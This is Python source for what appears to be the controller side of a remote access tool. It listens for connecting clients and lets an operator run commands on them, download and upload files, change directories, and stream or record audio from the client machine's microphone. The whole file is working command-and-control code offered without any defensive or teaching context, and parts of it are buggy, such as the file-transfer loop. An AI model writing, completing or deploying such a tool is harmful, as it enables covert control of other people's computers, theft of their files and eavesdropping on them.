import os
import socket
from queue import Queue
from threading import Thread
import keyboard

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5003
BUFFER_SIZE = 4096


def download():
    full_path = input('Give app to client file full path: ')
    client_socket.send(full_path.encode())
    filename = os.path.basename(full_path)
    filesize = client_socket.recv(BUFFER_SIZE).decode()
    filesize = int(filesize)
    with open(filename, 'wb') as f:
        for _ in range(filesize):
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if len(bytes_read) < BUFFER_SIZE:
                f.write(bytes_read)
                print(filename + ' File received!')
                break
            f.write(bytes_read)


def upload():
    full_path = input('Give app to server file full path: ')
    filename = os.path.basename(full_path)
    client_socket.send(full_path.encode())
    filesize = os.path.getsize(full_path)
    filesize_send = str(filesize)
    client_socket.send(filesize_send.encode())
    with open(full_path, "rb") as f:
        for _ in range(filesize):
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                print(filename + ' File send!')
                break
            client_socket.sendall(bytes_read)


def change_dir():
    full_path = input('Enter the full path to the directory: ')
    client_socket.send(full_path.encode())


def stream_audio():
    import pyaudio
    chunk = 512
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                    input=True, output=True, frames_per_buffer=chunk)
    print('There is a broadcast!!! \nPress "Esc" to finish.')
    while True:
        # Recieve data from the client:
        data = client_socket.recv(1024)
        stream.write(data, chunk)
        # TODO
        # How to finish the sound transfer so that the program doesn't fly out?
        if keyboard.is_pressed('esc'):
            print('audio stream is stopped')
            break


def record_audio():
    time = int(input('Enter the recording duration in seconds: '))
    time = str(time)
    client_socket.send(time.encode())


def thread_line(q):
    n_threads = 5
    for t in range(n_threads):
        worker = Thread(target=socket_accept)
        # Demon run.
        worker.daemon = True
        worker.start()
    # Waiting until the line is empty.
    q.join()
    q.task_done()


def socket_create():
    # Create Sockets
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print('Soket creation error: ' + str(msg))


def socket_bind():
    # Сreating. I'm listening to the network.
    try:
        global s
        q = Queue()
        print('Bindding socket to port: ' + str(SERVER_PORT))
        s.bind((SERVER_HOST, SERVER_PORT))
        q.put(s.listen(5))
        thread_line(q)
    except socket.error as msg:
        print('Soket bindding error: ' + str(msg) + '\n' + 'Retrying...')
        socket_bind()


def socket_accept():
    # I'm hooking up everyone who's asking.
    global client_socket
    client_socket, client_address = s.accept()
    print('Connection has been established | ' + 'IP ' + client_address[0] +
          ' | Port ' + str(client_address[1]))
    send_commands()
    client_socket.close()


def send_commands():
    # Instruction execution.
    while True:
        command = input('Enter the command you wanna execute:')
        client_socket.send(command.encode())
        if command.lower() == 'exit':
            break
        elif command.lower() == 'download':
            download()
        elif command.lower() == 'upload':
            upload()
        elif command.lower() == 'change dir':
            change_dir()
        elif command.lower() == 'stream audio':
            stream_audio()
        elif command.lower() == 'record audio':
            record_audio()

        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)


def main():
    # Launcher.
    socket_create()
    socket_bind()
    socket_accept()


main()
